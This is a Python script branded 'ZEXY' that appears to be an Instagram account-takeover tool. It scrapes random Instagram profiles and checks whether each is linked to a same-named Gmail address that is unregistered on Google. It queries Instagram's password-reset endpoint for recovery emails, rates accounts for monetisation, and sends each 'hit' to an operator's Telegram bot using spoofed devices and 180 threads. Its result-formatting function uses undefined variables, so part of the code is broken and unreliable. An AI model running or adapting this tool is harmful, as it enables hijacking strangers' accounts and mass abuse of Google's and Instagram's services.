import sys
import os
import time
import random
import json
import re
import requests
import threading
import uuid
import secrets
import base64
import httpx
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent
from cfonts import render

R = "\033[91m"
O = "\033[93m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
M = "\033[95m"
G = "\033[92m"
GREY = "\033[90m"
RESET = "\033[0m"
B = "\033[1m"

def _ui_clear():
    os.system('cls' if os.name == 'nt' else 'clear')
def _zexy_banner():
    return render('ZEXY', colors=['red', 'red'], align='center')
hits = 0
good = 0
bad = 0
bad_email = 0
current_email = "Waiting..."
lock = threading.Lock()

def display():
    global hits, good, bad, bad_email, current_email
    with lock:
        _ui_clear()
        print(_zexy_banner())
        print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
        print(f"{G}𝗛𝗜𝗧𝗦 : {W}{hits}{RESET}")
        print(f"{Y}𝗚𝗢𝗢𝗗 𝗜𝗚 : {W}{good}{RESET}")
        print(f"{R}𝗕𝗔𝗗 𝗜𝗚 : {W}{bad}{RESET}")
        print(f"{C}𝗧𝗔𝗞𝗘𝗡 𝗠𝗔𝗜𝗟 : {W}{bad_email}{RESET}")
        print(f"{C}𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗠𝗔𝗜𝗟 : {W}{current_email}{RESET}")
        print(f"{M}𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 : @ZEXYxERA{RESET}")
        print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
        sys.stdout.flush()

class Zexypy:
    def __init__(self):
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        threading.Thread(target=self._refresh_token, daemon=True).start()

    def _generate_ua(self):
        return generate_user_agent()

    def _refresh_token(self):
        while True:
            try:
                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))

                headers = {
                    "accept": "*/*",
                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "google-accounts-xsrf": "1",
                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "user-agent": self._generate_ua(),
                }

                res1 = requests.get(
                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                    headers=headers,
                    timeout=15
                )
                tok = re.search(
                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                    res1.text
                )
                if tok:
                    tl = tok.group(2)
                    cookies = {'__Host-GAPS': host}
                    headers2 = {
                        'authority': 'accounts.google.com',
                        'accept': '*/*',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                        'google-accounts-xsrf': '1',
                        'origin': 'https://accounts.google.com',
                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                        'user-agent': self._generate_ua(),
                    }
                    data = {
                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                    }
                    response = requests.post(
                        'https://accounts.google.com/_/signup/validatepersonaldetails',
                        cookies=cookies,
                        headers=headers2,
                        data=data,
                        timeout=15
                    )
                    if '",null,"' in response.text:
                        tl = response.text.split('",null,"')[1].split('"')[0]
                    host = response.cookies.get('__Host-GAPS', host)
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except:
                pass

            try:
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/',
                    'user-agent': self._generate_ua(),
                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                    'x-same-domain': '1',
                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }
                params = {
                    'rpcids': 'NHJMOd',
                    'source-path': '/lifecycle/steps/signup/username',
                    'hl': 'en'
                }
                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
                response = requests.post(
                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                    params=params, headers=headers, data=data, timeout=15
                )
                tl_match = re.search(r'"TL:([^"]+)"', response.text)
                if tl_match:
                    tl = tl_match.group(1)
                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except:
                pass

            time.sleep(random.uniform(5, 15))

    def check_availability(self, email):
        if '@' in email:
            email = email.split('@')[0]

        try:
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                if not line:
                    raise Exception("Empty tl")
                tl, host = line.split('//')
        except:
            time.sleep(3)
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                tl, host = line.split('//')

        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
            'user-agent': generate_user_agent(),
        }
        params = {'TL': tl}
        data = (
            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
            f'&cookiesDisabled=false'
            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )

        response = requests.post(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=10
        )

        if '"gf.uar",1' in response.text:
            return 'good'
        elif '"er",null,null,null,null,400' in response.text:
            time.sleep(1)
            return self.check_availability(email)
        else:
            return 'bad'

class ZexyPy:
    def __init__(self):
        self.session = requests.Session()
        self.csrf = None
        self.lsd = None
        self.doc_id = "26672929172408668"
        self.lock = threading.Lock()

    def _ensure_tokens(self):
        with self.lock:
            if self.csrf and self.lsd:
                return True
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = self.session.get('https://www.instagram.com/', headers=headers, timeout=20)
            if response.status_code == 200:
                csrf = response.cookies.get('csrftoken', '')
                match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', response.text)
                lsd = match.group(1) if match else None
                if csrf and lsd:
                    with self.lock:
                        self.csrf = csrf
                        self.lsd = lsd
                    return True
        except:
            pass
        return False

    def check_email(self, email):
        url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
        device = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        family = str(uuid.uuid4())
        android = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        waterfall = str(uuid.uuid4())

        payload = {
            'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":" + str(int(time.time())) + ",\\\"aacjid\\\":\\\"" + str(uuid.uuid4()) + "\\\",\\\"aaccs\\\":\\\"" + secrets.token_urlsafe(32) + "\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\"" + email + "\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\"" + device + "\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\"" + str(uuid.uuid4()) + "\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\"" + android + "\",\"login_surface\":\"login_home\",\"waterfall_id\":\"" + waterfall + "\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\"" + family + "\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\"" + device + "\"}}",
            'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
            'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
        }
        headers = {
            'User-Agent': "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
            'accept-language': "en-IN, en-US",
            'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': android,
            'x-ig-app-id': "567067343352427",
            'x-ig-app-locale': "en_IN",
            'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
            'x-ig-device-id': device,
            'x-ig-family-device-id': family,
            'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
            'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
            'x-pigeon-rawclienttime': str(time.time()),
            'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        }
        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=20)
            if f"{email}" in resp.text:
                return True
            else:
                return False
        except:
            return False

    def get_user_data(self, user_id):
        if not self._ensure_tokens():
            return None
        url = "https://www.instagram.com/api/graphql"
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': self.lsd,
            'x-csrftoken': self.csrf,
            'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin'
        }
        cookies = {'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'}
        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            'lsd': self.lsd,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
            'variables': json.dumps(variables),
            'server_timestamps': 'true',
            'doc_id': self.doc_id,
        }
        try:
            response = self.session.post(url, headers=headers, data=payload, cookies=cookies, timeout=20)
            if response.status_code == 200:
                data = response.json()
                user = data.get('data', {}).get('user')
                if user and user.get('username'):
                    return user
        except:
            pass
        return None

class ZexyPyy:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.log_file = "telegram_errors.log"
        self._telegram_working = True
        self._error_logged = False

    def ZexyPy1(self, msg, retries=3, delay=2):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}
        session = requests.Session()

        for attempt in range(retries):
            try:
                r = session.post(url, json=payload, timeout=15)
                if r.status_code == 200:
                    return True
                else:
                    if not self._error_logged:
                        with open(self.log_file, 'a') as f:
                            f.write(f"Telegram returned {r.status_code}: {r.text}\n")
                        self._error_logged = True
                    time.sleep(delay * (attempt + 1))
            except Exception as e:
                if not self._error_logged:
                    with open(self.log_file, 'a') as f:
                        f.write(f"Telegram send error: {e}\n")
                    self._error_logged = True
                time.sleep(delay * (attempt + 1))
        return False

    def send_telegram(self, msg):
        if not self._telegram_working:
            return False
        success = self.ZexyPy1(msg)
        if not success:
            self._telegram_working = False
        return success

    def save_to_file(self, msg, filename='ZexyNewhits.txt'):
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f'{msg}\n')

    def format_result(self, data):
        ZexyPy2 = data.get('username', '')
        ZexyPy1 = data.get('full_name', '')
        ZexyPy3 = data.get('follower_count') or 0
        ZexyPy4 = data.get('following_count') or 0
        ZexyPy5 = data.get('media_count') or 0
        ZexyPy8 = data.get('email', f"{username}@gmail.com")
        domain = email.split('@')[1] if '@' in email else 'gmail.com'
        ZexyPy6 = data.get('biography', '')[:50]
        pk = data.get('pk', 0)
        is_private = data.get('is_private', False)

        try:
            pk = int(pk)
            year_ranges = [
                (2369359762, 4239516754, 2016), (4239516755, 6345108209, 2017),
                (6345108210, 10016232395, 2018), (10016232396, 27238602159, 2019),
                (27238602160, 43464475395, 2020), (43464475395, 50289297647, 2021),
                (50289297647, 57464707082, 2022), (57464707082, 63313426938, 2023),
                (63313426938, 70134323896, 2024), (70313426938, 78313496938, 2025)
            ]
            year = "2023+"
            for low, high, y in year_ranges:
                if low <= pk <= high:
                    year = str(y)
                    break
        except:
            year = "Unknown"

        ZexyPy22 = self._fetch_reset_email(username)

        moni_status = "❌"
        if not is_private and posts >= 3 and bio and len(bio) > 10:
            personal_words = ["my", "i", "me", "life", "vlog", "daily", "family", "love", "❤", "✨", "🎥"]
            if any(word in bio.lower() for word in personal_words):
                moni_status = "✅"
            elif posts >= 5:
                moni_status = "✅"

        box = f"""   
𝗭𝗘𝗫𝗬 𝗡𝗘𝗪 𝗛𝗜𝗧𝗦 𝗙𝗢𝗨𝗡𝗗 🎯 #{hits}                    
━━━━━━━━━━━━━━━━━━━━━━━━
👤 Name :- {ZexyPy1}
💌 Username :- @{ZexyPy2}
📧 Email :- {ZexyPy8}
📩 Reset :- {ZexyPy22}
👥 Followers :- {ZexyPy3}
👣 Following :- {ZexyPy4}
📸 Posts :- {ZexyPy5}
📝 Bio :- {ZexyPy6}
🗓️ Year:- {year}
💰 Moni :- {moni_status}
🔗 Profile Link :-www.instagram.com/{username}
━━━━━━━━━━━━━━━━━━━━━━━━
💻 𝗗𝗘𝗩 :- @ZEXYxERA | @ZexyPython
"""
        return box

    def _fetch_reset_email(self, username):
        try:
            headers = {
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "x-ig-app-id": "936619743392459",
                "x-requested-with": "XMLHttpRequest",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/accounts/password/reset/",
            }
            client = httpx.Client(http2=True, headers=headers, timeout=10)
            r = client.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": username}
            )
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "ok":
                    return data.get('obfuscated_email') or data.get('contact_point') or "-"
            return "-"
        except:
            return "-"

def main():
    _ui_clear()
    print(_zexy_banner())
    print(f"{R}⚡ ZEXY HIGH QUALITY ACCOUNT {GREY}│ {W}Initializing systems...")
    time.sleep(0.99)

    _ui_clear()
    print(_zexy_banner())
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    TOKEN = input(f" {G}🤖 Bot Token  {GREY}:-  {W}").strip()
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    CHAT_ID = input(f" {G}🗨️ Chat ID    {GREY}:-  {W}").strip()
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    _ui_clear()
    print(_zexy_banner())

    reporter = ZexyPyy(TOKEN, CHAT_ID)
    google = Zexypy()
    insta = ZexyPy()

    def process_user():
        global hits, good, bad, bad_email, current_email
        while True:
            try:
                user_id = random.randint(2500000000, 21254029834)
                user_data = insta.get_user_data(user_id)
                if not user_data:
                    time.sleep(random.uniform(0.5, 1.5))
                    continue

                username = user_data.get('username')
                if not username:
                    continue

                email = f"{username}@gmail.com"
                current_email = email
                display()

                if insta.check_email(email):
                    good += 1
                    display()

                    if google.check_availability(email) == 'good':
                        hits += 1
                        display()

                        profile = {
                            'username': username,
                            'email': email,
                            'ZexyPy1': user_data.get('full_name', ''),
                            'follower_count': user_data.get('follower_count') or 0,
                            'following_count': user_data.get('following_count') or 0,
                            'media_count': user_data.get('media_count') or 0,
                            'is_private': user_data.get('is_private', False),
                            'biography': user_data.get('biography', ''),
                            'pk': user_data.get('pk', ''),
                        }
                        msg = reporter.format_result(profile)
                        print('\n' + msg)
                        reporter.save_to_file(msg)
                        reporter.send_telegram(msg)
                    else:
                        bad_email += 1
                        display()
                else:
                    bad += 1
                    display()

                time.sleep(random.uniform(0.8, 1.8))

            except Exception:
                time.sleep(random.uniform(1.0, 2.0))
                continue

    display()

    with ThreadPoolExecutor(max_workers=180) as executor:
        for _ in range(180):
            executor.submit(process_user)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print('\n@ZEXYxERA.')


if __name__ == "__main__":
    main()